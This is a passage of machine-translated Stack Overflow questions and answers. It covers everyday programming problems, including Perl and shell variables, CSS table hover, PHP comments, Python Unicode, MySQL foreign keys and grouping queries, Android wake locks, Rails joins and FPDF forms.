Dt=$( date --date='1 day ago' +"$myDate" ) 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2016-06-22T14:25:24.007

在 5.24 版本中，使用`"`而不是`'`也将 shell 变量传递给 perl。

```
mydate=22/6/2016
perl -e "print $mydate" 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-04-09T15:06:00.207

为什么不这样： `$ENV{'PATH'} = $ENV{'PATH'}.":"."/additional/path";`

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-11-16T23:52:12.787

对我来说，我需要使用`$ENV{'VARIABLE'}`将`VARIABLE`shell 传递给 Perl。我不知道为什么根本`$ENV{VARIABLE}`没有工作。

例如，

在 Bash 中：

```
#!/bin/bash -l
VARIABLE=1
export VARIABLE
perl example.pl 
```

在 Perl 中：

```
#!/usr/bin/perl -w
print "my number is " . $ENV{'VARIABLE'} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-10-26T20:39:25.780

与将值传递给任何其他程序的方式相同：将其作为 arg 传递。（您可能很想生成 Perl 代码，但这是个坏主意。）

```
Dt=$( perl -MPOSIX -e'my($m,$d,$y) = split qr{/}, $ARGV[0]; --$d; print strftime "%m/%d/%y", 0,0,0, $d,$m-1,$y-1900;' -- "$myDate" ) 
```

# email - 电子邮件迁移 API 限制

> ID：13093711
> 
> 赞同：0
> 
> 时间：2012-10-26T20:07:39.267
> 
> 标签：email, migration, limits, google-email-migration

在文档中，它指出 API 仅限于每个用户发送一封电子邮件，并且我们应该创建线程并一次处理多个用户。有谁知道这是否是任何其他类型的限制？多少 GB/小时？我必须计划迁移数万个帐户，硬件资源实际上是无限的，如果我开始一次迁移超过 1,000 个用户，我会在某处升旗还是被阻止？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T21:08:52.683

API 的限制发布在[https://developers.google.com/google-apps/email-migration/limits](https://developers.google.com/google-apps/email-migration/limits)。每个用户有一个速率限制，而不是每个用户每秒一个请求。如果超过此值，您将开始看到返回 503 错误。处理这个问题的最好方法是实现一个指数退避算法来处理错误并重试请求。

# html - 将鼠标悬停在该行中的单元格上时如何更改行颜色

> ID：13093716
> 
> 赞同：0
> 
> 时间：2012-10-26T20:08:00.657
> 
> 标签：html, css, css-tables

当我将鼠标悬停在该行中的一个单元格上时，CSS 中是否有任何方法可以更改由 3 列组成的表格中的行的背景颜色？

```
table tr:hover
{
    background-color:blue;
} 
```

似乎不起作用。

**更新**

我正在使用 Mozilla Firefox，它仅在我将鼠标悬停在`<th>`not a时才有效`<td>`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:16:46.500

This works fine for me:

[http://jsfiddle.net/EJ63m/](http://jsfiddle.net/EJ63m/)

```
<html>
<head>
<style>
table tr:hover
{
    background-color:blue;
}
</style>
</head>
<body>
<table>
    <tr><td>Foo</td><td>Bar</td><td>FooBar</td></tr>
    <tr><td>Bar</td><td>Foo</td><td>FooBar</td></tr>
</table>
</body>
</html> 
```

What browser are you using?

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:09:56.867

使用此语法：

```
tr.hover > td:hover
{
    background-color: blue;
}

<tr class="hover">
    <td>;lajsdfl;jasdl;jasd;f</td>
    <td>;lajsdfl;jasdl;jasd;f</td>
</tr> 
```

小提琴：http: [//jsfiddle.net/DQ9Vz/](http://jsfiddle.net/DQ9Vz/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-26T20:11:36.940

tr：悬停{背景颜色：红色；}

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-26T21:29:45.800

这就是解决它的方法。

```
table tr:hover > td
{
    background-color:aqua;
} 
```

# php - 在 PHP 的函数调用中使用哈希？

> ID：13093723
> 
> 赞同：6
> 
> 时间：2012-10-26T20:08:33.383
> 
> 标签：php, function

昨天我参加了 PHP 开发者职位的面试。我的工作是在非常简单的测试中解决 15 个问题。问题之一是标记所有地方，在给定的示例 PHP 代码中，执行将因*致命错误*而停止。其中，我将以下内容标记为错误：

```
$this->someFunction(#); 
```

面试的另一个人告诉我，我错了，因为这不是一个致命的错误。

有人可以启发我，为什么以及如何在 PHP 函数调用中使用哈希 (#)？我从来没有见过这样的结构，谷歌几乎没有告诉我这个（或者我做了错误的搜索）。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-26T20:13:49.720

该`#`字符用于单行注释。

这本身就是一个语法错误，因为没有`)`

```
$this->someFunction(#); 
```

这被读作：

```
$this->someFunction( 
```

但是，如果这之后有行，那就没关系了。例子：

```
$this->someFunction(#);
    'a', 'b', 'c'
); 
```

这`#);`是一个注释，没有被解析，所以 PHP 看到

```
$this->someFunction(
    'a', 'b', 'c'
); 
```

这是有效的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-26T20:12:31.250

这将导致“解析错误”，而不是致命的。只需自己检查即可。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-26T20:13:58.530

PHP 代码通常使用 C 风格的注释（`//`和`/* */`）。但是，PHP*确实*使用[shell 样式的注释](http://php.net/manual/en/language.basic-syntax.comments.php)（即`#`）。因此，`#I think PHP is ignoring all my comments`是一个有效的评论。

在上面的代码中，你会得到一个致命的语法错误，因为 PHP 只能看到`$this->someFunction(`（没有右括号或分号）。

# python - 如何用其他python替换字符串中的unicode字符？

> ID：13093727
> 
> 赞同：51
> 
> 时间：2012-10-26T20:08:44.647
> 
> 标签：python, unicode

由于项目符号列表，我有一个字符串是从阅读带有符号“•”的项目符号的 HTML 网页中获得的。请注意，该文本是来自使用 Python 2.7 的网页的 HTML 源代码`urllib2.read(webaddress)`。

我知道项目符号字符的 unicode 字符为`U+2022`，但我如何实际用其他东西替换该 unicode 字符？

我试着做 `str.replace("•", "something")`

但它似乎不起作用......我该怎么做？

* * *

## 回答 #1

> 赞同：77
> 
> 时间：2012-10-26T20:23:18.247

1.  将字符串解码为 Unicode。假设它是 UTF-8 编码的：

    ```
    str.decode("utf-8") 
    ```

2.  调用该`replace`方法并确保将 Unicode 字符串作为其第一个参数传递给它：

    ```
    str.decode("utf-8").replace(u"\u2022", "*") 
    ```

3.  如果需要，编码回 UTF-8：

    ```
    str.decode("utf-8").replace(u"\u2022", "*").encode("utf-8") 
    ```

（幸运的是，Python 3 停止了这种混乱。第 3 步实际上应该只在 I/O 之前执行。另外，请注意调用字符串会`str`隐藏内置类型`str`。）

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-10-26T20:24:25.157

将字符串编码为 un​​icode。

```
>>> special = u"\u2022"
>>> abc = u'ABC•def'
>>> abc.replace(special,'X')
u'ABCXdef' 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-26T20:16:42.473

```
import re
regex = re.compile("u'2022'",re.UNICODE)
newstring = re.sub(regex, something, yourstring, <optional flags>) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-09-10T01:14:55.213

试试这个。

你会得到一个普通字符串的输出

```
str.encode().decode('unicode-escape') 
```

之后，您可以执行任何替换。

```
str.replace('•','something') 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2018-11-19T12:00:07.323

有趣的答案隐藏在答案之中。

```
str.replace("•", "something") 
```

如果您使用正确的语义，它将起作用。

```
str.replace(u"\u2022","something") 
```

创造奇迹 ;) ，感谢 RParadox 的提示。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2021-07-23T10:26:48.457

如果要删除所有 \u 字符。下面的代码给你

```
def replace_unicode_character(self, content: str):
    content = content.encode('utf-8')
    if "\\x80" in str(content):
        count_unicode = 0
        i = 0
        while i < len(content):
            if "\\x" in str(content[i:i + 1]):
                if count_unicode % 3 == 0:
                    content = content[:i] + b'\x80\x80\x80' + content[i + 3:]
                i += 2
                count_unicode += 1
            i += 1

        content = content.replace(b'\x80\x80\x80', b'')
    return content.decode('utf-8') 
```

# c# - 如何在 Windows 服务应用程序中添加资源？

> ID：13093729
> 
> 赞同：0
> 
> 时间：2012-10-26T20:08:46.953
> 
> 标签：c#, visual-studio-2010, windows-services

有没有办法在windows服务应用程序的资源中添加ttf字体？

谢谢。

# mysql - MySQL InnoDB 表添加外键 errno:150

> ID：13093732
> 
> 赞同：1
> 
> 时间：2012-10-26T20:09:06.680
> 
> 标签：mysql, sql, entity-relationship, foreign-key-relationship, indexing

嗯，我有两张桌子

### publica_evento_grupo

```
Field | Type | Null | Key | Default | Extra
id_evento_grupo int(10) unsigned    NO  PRI     auto_increment
id_evento       int(8)  unsigned    NO  MUL     
id_grupo        int(8)  unsigned    NO  MUL     
identificacao   varchar(55)         NO 
```

### publica_identificacao_publicacao

```
Field | Type | Null | Key | Default | Extra
id_evento       int(8) unsigned NO  PRI     
identificacao   varchar(55)     NO  PRI 
```

`publica_evento_grupo`. `id_evento`in 是第三个名为**publica_evento**的表的外键，但也是与表的列一起的外键`publica_identificacao_publicacao`。`identificacao`. 问题是，我必须通过 key 创建将**publica_evento_grupo**与**publica_identificacao_publicacao**相关联的外键`id_evento`，但是当我尝试使用 column 创建另一个 FK 时`identificacao`，它会给出下面的 errno

```
 [Err] 1005 - Can't create table '#sql-1049_1980992' (errno: 150). 
```

如您所见，表**publica_identificacao_publicacao**有两个 PK，这就是它必须是 2 个 FK 才能关联它们的原因，我还没有创建索引，因为据我所知，我只需要在之后创建索引添加 FK 约束，我能够为**eventto_grupo**和**identificacao_publicacao**`id_evento`之间的列创建 FK 约束，我不知道为什么只有该列给出此错误****`identificacao`****

 ******编辑 1：@RolandBouman 我无权使用该命令 SHOW ENGINE INNODB STATUS**

**编辑 2：@Geoff_Montee 实际上你传递的命令有效，不明白为什么我使用那个结构看看这个问题[MySQL UNIQUE Con​​straint multiple columns condition](https://stackoverflow.com/questions/13074400/mysql-unique-constraint-multiple-columns-condition)**

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-26T20:43:55.600

如果没有实际的 DDL，就很难说。我建议这样做：

```
SHOW ENGINE INNODB STATUS; 
```

遇到此错误后立即。在输出中，查找如下所示的部分：

```
------------------------
LATEST FOREIGN KEY ERROR
------------------------
121026 22:40:18 Error in foreign key constraint of table test/#sql-154c_94:
foreign key(rid) references bla(id):
Cannot find an index in the referenced table where the
referenced columns appear as the first columns, or column types
in the table and the referenced table do not match for constraint.
Note that the internal storage type of ENUM and SET changed in
tables created with >= InnoDB-4.1.12, and such columns in old tables
cannot be referenced by such columns in new tables.
See http://dev.mysql.com/doc/refman/5.5/en/innodb-foreign-key-constraints.html
for correct foreign key definition. 
```

您将在那里找到有关外键定义有什么问题的详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:21:19.990

该错误通常发生是因为引用表和被引用表之间存在类型不匹配。在这种情况下，类型似乎匹配。

您是否考虑过对主复合键中的两个字段都有约束？您可能必须首先删除现有的外键约束`id_evento`。

```
ALTER TABLE publica_evento_grupo ADD FOREIGN KEY 
    (id_evento, identificacao) REFERENCES 
    publica_identificacao_publicacao (id_evento, identificacao); 
```

似乎这种情况下的错误可能是因为您尝试仅将外键约束添加到复合**主**键的**一部分。**

 **是否`identificacao`存在于任何其他表中？为什么要仅将外键约束添加到复合主键的一部分？

这样想吧……

假设您在`publica_evento_grupo`表中对`identificacao`字段本身有一个外键约束。让我们在`publica_identificacao_publicacao`表中说你有`(1, "some string")`和`(2, "some string")`。因此，如果您删除`(2, "some string")`，但保留`(1, "some string")`其位置。表中引用的行`(1, "some string")`会`publica_evento_grupo`抱怨，即使它们不应该！

因此，在我看来，您应该为所有主键添加外键约束，或者不添加任何主键。******

# regex - 带有日期时间和时区的正则表达式

> ID：13093736
> 
> 赞同：-1
> 
> 时间：2012-10-26T20:09:26.043
> 
> 标签：regex

我需要一个用于日期时间和时区的正则表达式。我正在遍历 PC 技术说明的长字符串，我需要找到日期时间和时区，然后在用户 ID 之后找到下一个空格。时区被硬编码为“东部标准时间-”。

我的字符串如下所示：

```
10/18/2012 4:30 PM Eastern Standard Time - userID1 I rebooted the PC.  10/18/2012 4:30 PM Eastern Standard Time - userID2 The reboot that the other tech performed did not fix the issue. 
```

用户 ID 可以是 6 或 8 个字符长。我想在每个实例之后找到空间的索引并插入换行符。

我正在使用 C# 使用 ASP .NET 3.5。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:22:21.743

你在这里有一个例子：[演示](http://regexr.com?32jsn)

如果要反向引用用户名，只需`(\w{5,8})`在`[^\.]`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-01T17:48:23.370

这是工作代码：

```
protected string FormatTechNote(string note)
{
    //This method uses a regular expression to find each date time techID stamp
    //in a note on a ticket.  It finds the stamp and then adds spacing for clarity
    //while reading.

    //RegEx for Date Time Eastern Standard Time - techID (6 or 8 characters in techID)
    Regex dateTimeStamp = new Regex(@"((((0?[1-9]|1[012])/(0?[1-9]|1\d|2[0-8])|(0?[13456789]|1[012])/(29|30)|(0?[13578]|1[02])/31)/(19|[2-9]\d)\d{2}|0?2/29/((19|[2-9]\d)(0[48]|[2468][048]|[13579][26])|(([2468][048]|[3579][26])00))).([1-9]|1[012]):[0-5][0-9].[AP]M.Eastern Standard Time - [a-z0-9_-]{6,8})");

    MatchCollection matchList = dateTimeStamp.Matches(note);
    if (matchList.Count > 0)
    {
        //If at least one match occurs then insert a new line after that instance.
        Match firstMatch = matchList[0];

        note = Regex.Replace(note, matchList[0].Value, matchList[0].Value + "<br /><br />");

        //If more than one match occurs than insert a new line before and after each instance.
        if (matchList.Count > 1)
        {
            for (int j = 1; j < matchList.Count; j++)
            {
                note = Regex.Replace(note, matchList[j].Value, "<br /><br /><br />" + matchList[j].Value + "<br /><br />");
            }
        }
    }

    //TrackIt uses 5 consecutive spaces for a new line in the note, and 8
    //consecutive spaces for two new lines.  Check for each and then
    //replace with new line(s).

    note = Regex.Replace(note, @"\s{8}", "<br /><br /><br />");

    note = Regex.Replace(note, @"\s{5}", "<br /><br />");

    return note;
} 
```

# android - 系统范围的唤醒锁定和释放取决于电源连接

> ID：13093740
> 
> 赞同：0
> 
> 时间：2012-10-26T20:09:50.407
> 
> 标签：android, android-wake-lock

我正在尝试开发一个简单的 android 应用程序，当设备插入时，即通过扩展坞，屏幕会获取唤醒锁，这样屏幕就不会关闭，无论它们在什么应用程序中，当拔下唤醒时锁被释放。

目前我没有运行任何服务，因为我认为它不需要。它接收电源连接和电源断开的广播意图。连接电源时，它似乎成功获取了唤醒锁，但当电源断开时，它试图释放唤醒锁，但抛出空指针异常。我猜是因为该应用程序不一定正在运行并且没有服务，因此不会保留该变量。

下面是我正在使用的接收广播的代码。

```
public class BroadcastReceiveDetection extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) 
    {
        ManageScreenLight manageScreenLight = new ManageScreenLight(context);
        String action = intent.getAction();

        if (action == Intent.ACTION_POWER_CONNECTED)
        {
            manageScreenLight.receivedPowerConnected();
        }
        else if (action == Intent.ACTION_POWER_DISCONNECTED)
        {
            try {
                manageScreenLight.receivedPowerDisconnected();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }
} 
```

下面是获取和释放唤醒锁的代码。

```
Context context;
    PowerManager.WakeLock wakeLock;
    public ManageScreenLight(Context context)
    {
        this.context = context;
    }

    public void receivedPowerConnected()
    {
        Toast.makeText(context, "Power connected", Toast.LENGTH_LONG).show();

        PowerManager pm = (PowerManager)context.getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK, "ScreenStay");
        wakeLock.acquire();
    }

        public void receivedPowerDisconnected() throws IOException
{
    try
    {
        Toast.makeText(context, "Power disconnected", Toast.LENGTH_LONG).show();
        wakeLock.release();
    }
    catch (Exception ex)
    {
        Toast.makeText(context, ex.toString(), Toast.LENGTH_LONG).show();
    }
} 
```

有没有办法可以工作我需要有一个服务在获取唤醒锁时运行，一旦断开电源释放并停止服务。

感谢您的任何帮助，您可以提供。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:17:13.070

Well, based on the [BroadcastReceiver](http://developer.android.com/reference/android/content/BroadcastReceiver.html) documentation, it looks like `onReceive()` doesn't get called when your application is killed, which makes sense. Android won't launch your application if it has killed it just to call `onReceive()`. You will need to use a service if you want to continue receiving/responding to these events.

# android - 在 ViewPager 项目上添加垂直滑动以“关闭”它们

> ID：13093741
> 
> 赞同：0
> 
> 时间：2012-10-26T20:09:51.713
> 
> 标签：android, android-viewpager, swipe

我知道不发布代码并且不解释他们所做的事情的人在这里不受欢迎，但我认为以下问题可能真的会引起很多开发人员的兴趣，并且可能值得尝试提出。

我正在使用经典的 ViewPager 在我的应用程序中显示一些信息，我最近在规划扑克应用程序中看到了一个很好的例子。

这很棒而且很棒，但我真正想要实现的是垂直滑动以删除 ViewPager 中的卡片。

老实说，我没有地方开始，甚至通过查看 ViewPager 源代码，我都感到有点失落。

您是否知道是否有人已经尝试过这种行为？

如果答案是否定的，我将继续尝试并在这里发布更新，但由于我已经浪费了几个小时，我担心这会很困难。

![在此处输入图像描述](../Images/98eea0a846819980ee8004499ad5c9fa.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:43:10.540

是的，这是可能的，也很容易。您只需要在您的活动中实现一个gestureListner，然后在垂直滑动的onFling() 方法跟踪中实现。休息完全取决于您的实施。

我添加一小段代码只是为了给你一个起点。

```
 private int swipe_Min_Distance = 200;
 private int swipe_Max_Distance = 600;
 private int swipe_Min_Velocity = 100;

public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX,
   float velocityY) {
if(xDistance > this.swipe_Max_Distance || yDistance > this.swipe_Max_Distance)
   return false;

  velocityX = Math.abs(velocityX);
  velocityY = Math.abs(velocityY);
        boolean result = false;

if(velocityY > this.swipe_Min_Velocity && yDistance > this.swipe_Min_Distance){
   if(e1.getY() > e2.getY()) // bottom to up swipe
   {
        //here you can do what ever you want after detection of your swipe
       }
   else{  //top to bottom swipe
    //here you can do what ever you want after detection of your swipe
       }

   result = true;
  }

   return result; 
```

# ruby-on-rails - rails has_many_through 创建双连接，如何优化？

> ID：13093747
> 
> 赞同：1
> 
> 时间：2012-10-26T20:10:11.360
> 
> 标签：ruby-on-rails, activerecord

我有一种情况，学校和 EventLeg 记录通过属于给定事件的照片绑定在一起。

```
class Photo < ActiveRecord::Base
  belongs_to :event
  belongs_to :event_leg
  has_and_belongs_to_many :schools
end
class Event < ActiveRecord::Base
  has_many :event_legs, :through => :photos, :group => 'event_legs.id'
  has_many :photos
end
class School < ActiveRecord::Base
  has_and_belongs_to_many :photos
  has_many :events, :through => :photos
  has_many :event_legs, :through => :photos
end
class EventLeg < ActiveRecord::Base
  has_many :photos
  has_many :schools, :through => :photos
end 
```

我需要在某个事件中获取出现在给定事件段中的学校。

```
@event = Event.find 4088
@event.schools.joins(:photos).where('photos.event_leg_id' => 28034) 
```

这导致 SQL 将`photos_schools`表连接两次，一次 to`schools`和一次 to `photos`：

```
SELECT DISTINCT `schools`.* FROM `schools` 
INNER JOIN `photos_schools` `photos_schools_join` ON `photos_schools_join`.`school_id` = `schools`.`id` 
INNER JOIN `photos` `photos_schools_2` ON `photos_schools_2`.`id` = `photos_schools_join`.`photo_id` 
INNER JOIN `photos_schools` ON `schools`.`id` = `photos_schools`.`school_id` 
INNER JOIN `photos` ON `photos_schools`.`photo_id` = `photos`.`id` 
WHERE `photos`.`event_id` = 4088 AND `photos`.`event_leg_id` = 28034 
```

photos_schools -> photos 的第二个 JOIN 是不必要的，下面的查询做同样的事情而且速度更快：

```
SELECT DISTINCT `schools`.* FROM `schools` 
INNER JOIN `photos_schools` ON `schools`.`id` = `photos_schools`.`school_id` 
INNER JOIN `photos` ON `photos_schools`.`photo_id` = `photos`.`id` 
WHERE `photos`.`event_id` = 4088 AND photos.event_leg_id = 28034; 
```

那么为什么 AR 会创建第二组连接，我怎样才能让它停止呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-27T10:07:21.713

尝试跳过连接（：照片）我想它应该可以工作

```
 @event.schools.where('photos.event_leg_id' => 28034) 
```

# asp.net-mvc - MVC3实体连接字符串消失

> ID：13093754
> 
> 赞同：1
> 
> 时间：2012-10-26T20:10:30.353
> 
> 标签：asp.net-mvc, entity-framework, web-config, connection-string

我目前的项目有一个非常令人沮丧的问题。它不断丢失实体模型的连接字符串绑定。

我有多个模型用于不同区域的不同数据库，并且没有问题。突然间，每当我尝试从数据库更新时，我都会收到连接字符串设置提示。我选择将其添加到带有密码的 Web.config 中，但它再也不会在那里拾取它。它们都仍在网络配置中，但它只是看不到它们。

如果我从配置文件中删除所有连接字符串，它将在那里写入新的连接字符串。然后，当我尝试设置存储过程/函数导入时，我仍然在下面的框中得到语句：

```
No database connection has been configured for this model. 
```

我已经尝试重建项目并从头开始再次创建模型，并且工作了一段时间。当我尝试将项目置于 Perforce 源代码控制下时，它最终会重新损坏并且连接字符串消失。它也影响了我所有的模型。

我还使用 EF 4.x DbContext Generator 来创建上下文文件。他们工作正常。我还能够运行该应用程序，它可以很好地连接到数据库并返回数据。那里没有问题。我只是无法从数据库更新实体复杂类型或导入更多存储过程。

更奇怪的是，我从另一个目录打开了一个损坏的项目，然后打开了一个未损坏的副本，它也立即损坏了。传染性的！

关于在哪里查看以了解为什么会发生这种情况的任何想法？其他人遇到过这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T20:26:06.317

我似乎找到了问题的来源。

我的 web.config 中的某个地方似乎有一个错误的值，这会导致问题。这是我发现的解决方法并显示了它的配置：

*   当绑定中断时，我关闭了项目，然后将 web.config 替换为一个来自良好构建的 web.config，该构建缺少几个键，但工作得很好，可以绑定。
*   我重新打开解决方案，“无数据库连接...”错误消失。
*   然后，当解决方案仍然打开时，我将 web.config 重新换回，它仍然有效。

这远非最佳，但我可以工作，直到通过一些比较找出坏值。

一旦确定确切的问题，我将再次对此发表评论。

# mysql - 根据另一个表从一个表中获取记录的最佳方法

> ID：13093757
> 
> 赞同：0
> 
> 时间：2012-10-26T20:10:42.297
> 
> 标签：mysql

我有 2 张桌子：`twitter_followers`和`twitter_friends`. 两个表都有很多列（`id`、`user_id`、`twitter_id`等）。对于单个`user_id`的两个表中的行数可以超过 100000 条记录。

我想通过以下方式从`twitter_friends`of中检索记录：`user`

```
SELECT * 
FROM twitter_friends 
WHERE user_id=1 
AND twitter_id NOT IN (SELECT twitter_id FROM twitter_followers WHERE user_id=1) 
```

此查询适用于少量数据，但任何人都可以帮助我获得大量数据（最好在几秒钟内）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:21:58.657

MySql 的子查询性能非常糟糕。我建议使用 JOIN 语句。

喜欢：

```
Select Friends.*, Followers.twitter_id
from twitter_friends as Friends
LEFT JOIN twitter_followers as Followers
 on Friends.USER_ID = Followers.USER_ID
where friends.user_id=1 AND followers.twitter_id is null; 
```

# mysql - 在提供额外选择的同时对查询进行分组

> ID：13093761
> 
> 赞同：3
> 
> 时间：2012-10-26T20:11:03.223
> 
> 标签：mysql, sql, oracle, postgresql, derby

我有以下查询

```
select t1.file_name, 
       max(create_date), 
       t1.id 
 from dbo.translation_style_sheet AS t1 
GROUP BY t1.file_name 
```

我想将 id 添加到选择中，但每次我这样做时，它都会返回所有结果而不是我的分组结果

我的目标是回来

```
pdf | 10/1/2012 | 3
doc | 10/2/2012 | 5 
```

但是我的查询正在返回

```
pdf | 9/30/2012 | 1
pdf | 9/31/2012 | 2
pdf | 10/1/2012 | 3
doc | 10/1/2012 | 4
doc | 10/2/2012 | 5 
```

有人知道我在做什么错吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T20:20:58.430

如果您保证具有 的行`max(create_date)`也具有`id`最大值（您的示例数据有，但我不知道这是否是工件），您可以简单地选择`max(id)`

```
select t1.file_name, max(create_date), max(t1.id) 
  from dbo.translation_style_sheet AS t1 
 GROUP BY t1.file_name 
```

如果您不能保证这一点，并且您希望返回`id`具有 的行中的值，则`max(create_date)`可以使用分析函数。以下将在 Oracle 中工作，尽管不太复杂的数据库（如 Derby）不太可能支持它。

```
select t1.file_name, t1.create_date, t1.id
  from (select t2.file_name,
               t2.create_date,
               t2.id,
               rank() over (partition by t2.file_name 
                                order by t2.create_date desc) rnk
          from dbo.translation_style_sheet t2) t1 
  where rnk = 1 
```

您也可以使用子查询。这可能比分析函数方法更便携但效率更低

```
select t1.file_name, t1.create_date, t1.id
  from dbo.translation_style_sheet t1
 where (t1.file_name, t1.create_date) in (select t2.file_name, max(t2.create_date)
                                            from dbo.translation_style_sheet t2
                                           group by t2.file_name); 
```

或者

```
select t1.file_name, t1.create_date, t1.id
  from dbo.translation_style_sheet t1
 where t1.create_date = (select max(t2.create_date) 
                           from dbo.translation_style_sheet t2
                          where t1.file_name = t2.file_name); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:13:45.540

当您使用 GROUP BY 时，您必须在组中包含聚合函数未使用的所有字段。

```
select t1.file_name, max(create_date), t1.id from 
dbo.translation_style_sheet AS t1 GROUP BY t1.file_name, t1.id 
```

# css - 带 Calc 的流体 Silverlight 视频播放器 (100vw / 1.7777778)

> ID：13093770
> 
> 赞同：0
> 
> 时间：2012-10-26T20:11:53.977
> 
> 标签：css, silverlight, cross-browser

我有一个[Silverlight 视频播放器](http://test.flcbranson.org/flcevents.php)。当页面宽度小于 960px 时，播放器会进入 100% 宽度。我试图让高度与宽度一起调整（控件的宽度/ 1.77777778 + 40px）。

[caniuse.com](http://caniuse.com/#feat=calc)声明`calc()`在 IE9+、Firefox 14+、Chrome 21+ 和 Safari 6+ 中受支持。 [它还](http://caniuse.com/#feat=viewport-units)声明`vw`在 IE9+、Chrome 21+ 和 Safari 6+（无 Firefox）中受支持。

我正在使用这段 HTML：

```
<!-- I put silverlight first because firefox and opera won't embed an mp4/mp3
    firefox won't fall back to the silverlight install link if only mp4/mp3 is available (webm or ogg must be available for the fallback to work) -->
<object data="data:application/x-silverlight-2," type="application/x-silverlight-2">
    <!-- load the player -->
    <param name="source" value="http://iissmooth.webcastcenter.com/SmoothStreamingPlayer.xap"/>
    <!-- note the DeliveryMethod -->
    <param name="InitParams" value="DeliveryMethod=Progressive Download, mediaurl=http://www.flcbranson.org/media/GreaterFaithConference2013-Ad.mp4" />
        <!-- silverlight install link -->
        <p><a href="http://go.microsoft.com/fwlink/?LinkID=149156&v=4.0.50401.0"><img src="http://go.microsoft.com/fwlink/?LinkId=161376" alt="Get Microsoft Silverlight"></a></p>
        <p><a href="media/GreaterFaithConference2013-Ad.mp4">Download Video (MP4)</a></p>
</object> 
```

这一点CSS：

```
@media screen and (max-width:959px) {
    .events object {
        height:-moz-calc(100vw / 1.777777778 + 40px);
        height:-webkit-calc(100vw / 1.777777778 + 40px);
        height:-ms-calc(100vw / 1.777777778 + 40px);
        height:-o-calc(100vw / 1.777777778 + 40px);
        height:calc(100vw / 1.777777778 + 40px);
    }
} 
```

从理论上讲，它应该在 IE9+ 和 Chrome 21+ 中工作（都支持`calc()`和. 不幸的是，只有 IE9+ 工作（我对IE`vw`的支持水平印象深刻）。`calc()`

我还没有看到将 、 和除法组合起来以获取流体高度的教程或示例`calc()`，`vw`所以也许组合是问题所在。

我的代码有问题吗，或者这应该有效（也许我发现了一个错误）？

为了劝阻建议，我已经尝试过 JQuery `height()`（它不是流畅的，因为您必须刷新每个更改才能生效）。我想我可以包含一个一直查看页面宽度的功能。不过，我的努力是用 CSS 来完成。

[在另一个问题](https://stackoverflow.com/questions/8014731/how-to-make-video-player-fluid-width-and-height)中，我确实看到了对[FitVid.JS](http://fitvidsjs.com/)的引用。有对 Vimeo、YouTube 等的参考，但我怀疑它是否可以与本地 Silverlight 播放器一起使用（我需要 Silverlight 用于很多很多 WMV）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-11T17:52:45.590

高度计算可以使用相对填充完全在 css 中完成。Foundation Framework 将这种技术用于他们的 Flex Video。详细解释请查看[http://alistapart.com/article/creating-intrinsic-ratios-for-video](http://alistapart.com/article/creating-intrinsic-ratios-for-video)

# pdf - 我可以使用 FPDF 创建可编辑的 PDF 吗？

> ID：13093772
> 
> 赞同：0
> 
> 时间：2012-10-26T20:12:05.380
> 
> 标签：pdf, fpdf

如果我可以使用 FPDF 创建可编辑的表单，我没有运气。是否可以？我想创建一个带有可编辑单元格的表格，并能够通过更改保存它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T06:29:56.513

如果通过“能够通过更改保存它”意味着能够在 acrobat reader 中这样做，那么你就不走运了。

具有这种属性的 pdf 称为“启用阅读器”。启用 pdf 的阅读器包括使用 adobe 持有的私钥向其添加特殊电子签名（“使用权”签名）。因此，只有 adobe 软件（例如 Adob​​e acrobat）才能阅读器启用 pdf。

# sql - 添加具有相同名称的客户端并将其添加到不同的表中

> ID：13093773
> 
> 赞同：1
> 
> 时间：2012-10-26T20:12:10.933
> 
> 标签：sql, sql-server

我有一张包含以下数据的表：

表格1：

```
CUSIP DESC QUANTITY

1     ABC    300

1     ABC    400

1     ABC    500 
```

我想将此数据移动到表 2 中，但如果 cusip 和 desc 相同，则添加数量

表 2：

```
CUSIP DESC QUANTITY

1     ABC    1200 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-26T20:14:18.653

[`GROUP BY`](http://msdn.microsoft.com/en-us/library/ms177673.aspx)您的列和`SUM`数量：

```
INSERT INTO Table2
   SELECT CUSIP, [DESC], SUM(QUANTITY) AS QUANTITY
   FROM Table1
   GROUP BY CUSIP, [DESC] 
```

